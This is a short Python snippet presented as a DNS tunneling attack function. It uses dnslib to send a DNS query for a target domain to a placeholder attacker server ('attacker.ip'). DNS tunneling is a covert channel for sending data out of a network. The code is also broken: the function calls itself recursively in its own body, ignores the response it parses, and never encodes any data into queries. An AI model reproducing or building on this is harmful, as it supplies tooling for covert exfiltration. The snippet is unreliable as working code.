import dnslib


def dns_tunneling(target_domain, attacker_ip):
    query = dnslib.DNSRecord.question(target_domain)

    response = dnslib.DNSRecord.parse(query.send(attacker_ip))
    print("Response from attacker DNS server ; ")
    dns_tunneling("example.com", 'attacker.ip')
